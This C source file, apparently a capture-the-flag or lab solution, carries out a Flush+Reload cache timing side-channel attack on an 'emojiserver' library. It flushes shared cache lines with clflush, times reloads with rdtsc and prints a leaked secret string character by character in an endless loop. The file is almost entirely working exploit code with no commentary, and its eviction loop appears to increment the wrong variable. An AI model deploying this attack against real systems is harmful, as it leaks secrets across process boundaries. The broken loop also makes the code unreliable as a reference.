#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <wchar.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>

#include "emojiserver.h"

#define PORT 8080 
#define SIZE_ORDER 81
#define THRESHOLD 120
#define VAR_OFFSET		0x0b0 

unsigned char order[81]={26, 24, 17,  68, 41, 55, 57, 56, 54, 9, 53, 18,39, 71, 4, 63, 14, 30, 27, 12, 75, 33, 20, 38, 45, 40, 21, 69, 16, 2, 23, 13, 49, 8,19, 78, 76, 62, 3, 77, 67, 31, 50, 66,70, 47, 28, 15, 29, 36, 44, 79, 25, 60, 58, 22, 0, 32,1, 10, 73, 52, 11, 6, 80, 65, 42, 61, 74, 37, 46, 51, 35, 48, 5, 64, 59, 72, 34, 7, 43};

unsigned long probe(char *adrs) ;

wchar_t *emojis;


char* createNullPage(char *start,size_t size){

      
  char *src;	

  if ((src = mmap (start, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED|MAP_ANON, -1, 0))== (caddr_t) -1){
      printf ("mmap error for input\n");
      printf("error mmaping page %s\n",strerror(errno));
      exit(2);
  }
  if (src!=start){
    printf("requested %p recived %p \n",start,src);
    exit(3);
  }
  //printf("null page created at %p\n",src);
  srand(3);
  for (int i=0;i<size;i++){
    *(src+i)=rand()%255;
  }
  return src;
}




void flush(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" clflush 0(%0) \n"
	" mfence \n"
	" lfence \n"

 : 
 : "c" (adrs)
 : );
}

unsigned long probe(char *adrs) 
{
	volatile unsigned long time;
	asm __volatile__ (
	" mfence \n"
	" lfence \n"
	" rdtsc \n"
	" lfence \n"
	" movl %%eax, %%esi \n"
	" movl (%1), %%eax \n"
	" lfence \n"
	" rdtsc \n"
	" subl %%esi, %%eax \n"
	" clflush 0(%1) \n"

 : "=a" (time)
 : "c" (adrs)
 : "%esi", "%edx");
 return time;
}



int CheckGlobal(){
	
  unsigned char i;
  unsigned long t;

  for(i=0;i<81;i++){
	if (order[i]==0 || order[i]=='m'-'-'){
		continue;
	}
	t=probe((char *)&emojis[order[i]*160]);
	if (t<120){
		  //printf("%i:%c %u\n",order[i],order[i],t);
		  printf("%c",order[i]+'-');

	}
  }

}

void flushAll(){
	for(unsigned  i=0;i<(SIZE_ORDER);i++){
		flush((char *)&emojis[i*160]);
	}
}

//0x00000000004040b0 - > ptr, use avoid to flush it
void evict(char **list,int size){
  volatile int tmp;
  for (int i=0;i<2;i++){
   	for (int j=0;i<size;i++){
  		tmp=*(list[j]+VAR_OFFSET);
  		asm __volatile__("mfence\nlfence\n");
  	}


  }
 }


int main(){
	char *pages[8];
	emojis=getEmojis();
	setvbuf(stdout, NULL, _IONBF, 0);
   	pages[0]=(char *)createNullPage((void *)0x4004000,0x1000);
    	pages[1]=(char *)createNullPage((void *)0x4005000,0x1000);
    	pages[2]=(char *)createNullPage((void *)0x4006000,0x1000);
    	pages[3]=(char *)createNullPage((void *)0x4007000,0x1000);
    	pages[4]=(char *)createNullPage((void *)0x4008000,0x1000);
    	pages[5]=(char *)createNullPage((void *)0x4009000,0x1000);
    	pages[6]=(char *)createNullPage((void *)0x400a000,0x1000);
    	pages[7]=(char *)createNullPage((void *)0x400b000,0x1000);
    	//ComputeThreshold();
 
	printf("Using Threshold = %u\n",THRESHOLD);
	printf("emojis at %p\n",emojis);
	flushAll();
	while (1){
		evict(pages,8);
		CheckGlobal();
	}
	


  return 0;
}
